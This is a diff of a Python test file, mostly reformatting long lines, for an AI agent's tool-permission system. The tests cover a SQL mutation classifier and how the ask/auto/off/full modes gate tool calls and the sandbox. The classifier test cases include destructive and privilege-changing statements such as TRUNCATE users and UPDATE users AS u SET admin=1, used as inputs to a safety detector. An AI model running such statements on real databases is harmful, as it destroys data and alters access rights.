+        ),  # catalog metadata write
         ({"query": "LOCK TABLE users IN ACCESS EXCLUSIVE MODE"}, True),  # explicit lock
-        ({"query": "SECURITY LABEL FOR x ON TABLE t IS 'z'"}, True),  # security label write
-        ({"query": "CREATE POLICY p ON accounts USING (true)"}, True),  # row-security policy DDL
+        (
+            {"query": "SECURITY LABEL FOR x ON TABLE t IS 'z'"},
+            True,
+        ),  # security label write
+        (
+            {"query": "CREATE POLICY p ON accounts USING (true)"},
+            True,
+        ),  # row-security policy DDL
         ({"query": "SELECT comment FROM t"}, False),  # 'comment' column stays safe
         ({"query": "SELECT * FROM locks"}, False),  # 'locks' table stays safe
         ({"query": "SELECT nextval('billing_seq')"}, True),  # sequence advance mutates
         ({"query": "SELECT pg_advisory_lock(42)"}, True),  # advisory lock changes state
-        ({"query": "SELECT pg_notify('jobs', 'wake')"}, True),  # server-side notification
+        (
+            {"query": "SELECT pg_notify('jobs', 'wake')"},
+            True,
+        ),  # server-side notification
         ({"query": "SELECT set_config('x', 'y', false)"}, True),  # session config write
-        ({"query": "SELECT nextval_col FROM t"}, False),  # 'nextval' column prefix stays safe
+        (
+            {"query": "SELECT nextval_col FROM t"},
+            False,
+        ),  # 'nextval' column prefix stays safe
         ({"query": "TRUNCATE users"}, True),  # multi-char table name (bare TRUNCATE)
         ({"query": "TRUNCATE TABLE accounts"}, True),  # multi-char TRUNCATE TABLE
         ({"query": 'TRUNCATE TABLE "users"'}, True),  # quoted TRUNCATE target
-        ({"query": "TRUNCATE accounts RESTART IDENTITY"}, True),  # TRUNCATE with options
-        ({"query": "SELECT truncate_log FROM t"}, False),  # 'truncate' column stays safe
-        ({"query": "UPDATE users AS u SET admin=1"}, True),  # aliased UPDATE target (AS)
+        (
+            {"query": "TRUNCATE accounts RESTART IDENTITY"},
+            True,
+        ),  # TRUNCATE with options
+        (
+            {"query": "SELECT truncate_log FROM t"},
+            False,
+        ),  # 'truncate' column stays safe
+        (
+            {"query": "UPDATE users AS u SET admin=1"},
+            True,
+        ),  # aliased UPDATE target (AS)
         ({"query": 'UPDATE "users" AS u SET x=1'}, True),  # quoted+aliased UPDATE
-        ({"query": "UPDATE public.users AS u SET x=1"}, True),  # schema-qualified aliased UPDATE
+        (
+            {"query": "UPDATE public.users AS u SET x=1"},
+            True,
+        ),  # schema-qualified aliased UPDATE
         ({"query": "SELECT * FROM users AS u"}, False),  # aliased SELECT stays safe
-        ({"query": "please update the documentation set"}, False),  # NL, no AS, stays safe
+        (
+            {"query": "please update the documentation set"},
+            False,
+        ),  # NL, no AS, stays safe
         ({"query": "GRANT SELECT ON t TO u"}, True),  # privilege grant (multi-word)
         ({"query": "REVOKE ALL ON t FROM u"}, True),  # privilege revoke (multi-word)
         ({"query": "SELECT * FROM grants"}, False),  # 'grants' table stays safe
@@ -1290,7 +1591,9 @@ def _drive(turns, decisions, **loop_kwargs):
     for ev in gen:
         events.append(ev)
         if ev["type"] == "tool_start" and ev.get("awaiting_confirmation"):
-            resolve_tool_decision(ev["approval_id"], next(decision_iter), session_id = session)
+            resolve_tool_decision(
+                ev["approval_id"], next(decision_iter), session_id = session
+            )
     return events, exec_fn
 
 
@@ -1316,7 +1619,9 @@ def test_auto_mode_does_not_gate_safe_calls():
         permission_mode = "auto",
     )
     starts = _tool_starts(events)
-    assert starts and starts[0]["awaiting_confirmation"] is False, _diag(events, exec_fn)
+    assert starts and starts[0]["awaiting_confirmation"] is False, _diag(
+        events, exec_fn
+    )
     assert starts[0]["approval_id"] == ""
     assert exec_fn.calls == [("python", {"code": "print(1)"})], _diag(events, exec_fn)
     assert exec_fn.disable_sandbox_seen == [False], _diag(
@@ -1368,7 +1673,9 @@ def test_off_mode_never_gates_and_keeps_sandbox():
         permission_mode = "off",
     )
     starts = _tool_starts(events)
-    assert starts and starts[0]["awaiting_confirmation"] is False, _diag(events, exec_fn)
+    assert starts and starts[0]["awaiting_confirmation"] is False, _diag(
+        events, exec_fn
+    )
     assert starts[0]["approval_id"] == ""
     assert exec_fn.disable_sandbox_seen == [False], _diag(events, exec_fn)
 
@@ -1381,7 +1688,9 @@ def test_full_mode_never_gates_and_drops_sandbox():
         permission_mode = "full",
     )
     starts = _tool_starts(events)
-    assert starts and starts[0]["awaiting_confirmation"] is False, _diag(events, exec_fn)
+    assert starts and starts[0]["awaiting_confirmation"] is False, _diag(
+        events, exec_fn
+    )
     assert exec_fn.disable_sandbox_seen == [True], _diag(events, exec_fn)
 
 
@@ -1394,7 +1703,9 @@ def test_bypass_flag_implies_full_mode():
         bypass_permissions = True,
     )
     starts = _tool_starts(events)
-    assert starts and starts[0]["awaiting_confirmation"] is False, _diag(events, exec_fn)
+    assert starts and starts[0]["awaiting_confirmation"] is False, _diag(
+        events, exec_fn
+    )
     assert exec_fn.disable_sandbox_seen == [True], _diag(events, exec_fn)
 
 
@@ -1424,7 +1735,9 @@ def test_unknown_permission_mode_normalizes_to_ask_on_request_models():
             )
             assert req.permission_mode == "ask", (cls.__name__, unknown)
         assert (
-            cls(messages = [{"role": "user", "content": "hi"}], permission_mode = None).permission_mode
+            cls(
+                messages = [{"role": "user", "content": "hi"}], permission_mode = None
+            ).permission_mode
             is None
         )
         for known in ("ask", "auto", "off", "full"):
@@ -1524,7 +1837,10 @@ def test_permission_mode_confirm_derivation():
 
     # An explicit confirm flag always wins (True gates, False opts out).
     assert _permission_mode_confirm(req(confirm_tool_calls = True, stream = False)) is True
-    assert _permission_mode_confirm(req(confirm_tool_calls = False, permission_mode = "ask")) is False
+    assert (
+        _permission_mode_confirm(req(confirm_tool_calls = False, permission_mode = "ask"))
+        is False
+    )
     # Explicit ask/auto always engage the gate (a non-streaming one is rejected
     # by the guard that reads this).
     assert _permission_mode_confirm(req(permission_mode = "ask", stream = False)) is True
@@ -1549,9 +1865,14 @@ def test_confirm_gate_needs_stream():
 
     safe = ["web_search", "search_knowledge_base"]
     # auto + a safe-only selection never prompts -> no stream needed.
-    assert _confirm_gate_needs_stream(req(permission_mode = "auto", enabled_tools = safe)) is False
     assert (
-        _confirm_gate_needs_stream(req(permission_mode = "auto", enabled_tools = ["web_search"]))
+        _confirm_gate_needs_stream(req(permission_mode = "auto", enabled_tools = safe))
+        is False
+    )
+    assert (
+        _confirm_gate_needs_stream(
+            req(permission_mode = "auto", enabled_tools = ["web_search"])
+        )
         is False
     )
     # render_html can prompt when its canvas reaches the network, so a selection
@@ -1565,9 +1886,15 @@ def test_confirm_gate_needs_stream():
     # But a selectable unsafe tool, an unrestricted (omitted) selection, MCP, or an
     # explicit confirm flag all still require streaming under auto.
     assert (
-        _confirm_gate_needs_stream(req(permission_mode = "auto", enabled_tools = ["terminal"])) is True
+        _confirm_gate_needs_stream(
+            req(permission_mode = "auto", enabled_tools = ["terminal"])
+        )
+        is True
     )
-    assert _confirm_gate_needs_stream(req(permission_mode = "auto", enable_tools = True)) is True
+    assert (
+        _confirm_gate_needs_stream(req(permission_mode = "auto", enable_tools = True))
+        is True
+    )
     assert (
         _confirm_gate_needs_stream(
             req(permission_mode = "auto", enabled_tools = ["web_search"], mcp_enabled = True)
@@ -1576,19 +1903,34 @@ def test_confirm_gate_needs_stream():
     )
     assert (
         _confirm_gate_needs_stream(
-            req(permission_mode = "auto", enabled_tools = ["web_search"], confirm_tool_calls = True)
+            req(
+                permission_mode = "auto",
+                enabled_tools = ["web_search"],
+                confirm_tool_calls = True,
+            )
         )
         is True
     )
     # An explicit empty selection runs no built-in tool, so nothing can prompt and
     # no stream is needed (distinct from an omitted list, which means all tools).
     assert (
-        _confirm_gate_needs_stream(req(permission_mode = "auto", enable_tools = True, enabled_tools = []))
+        _confirm_gate_needs_stream(
+            req(permission_mode = "auto", enable_tools = True, enabled_tools = [])
+        )
         is False
     )
     # ask prompts for every call, so even a safe-only selection needs streaming.
-    assert _confirm_gate_needs_stream(req(permission_mode = "ask", enabled_tools = safe)) is True
+    assert (
+        _confirm_gate_needs_stream(req(permission_mode = "ask", enabled_tools = safe))
+        is True
+    )
     # off/full never prompt; unset non-streaming keeps the legacy run-without-gate.
-    assert _confirm_gate_needs_stream(req(permission_mode = "off", enabled_tools = safe)) is False
-    assert _confirm_gate_needs_stream(req(permission_mode = "full", enabled_tools = safe)) is False
+    assert (
+        _confirm_gate_needs_stream(req(permission_mode = "off", enabled_tools = safe))
+        is False
+    )
+    assert (
+        _confirm_gate_needs_stream(req(permission_mode = "full", enabled_tools = safe))
+        is False
+    )
     assert _confirm_gate_needs_stream(req(enabled_tools = safe, stream = False)) is False
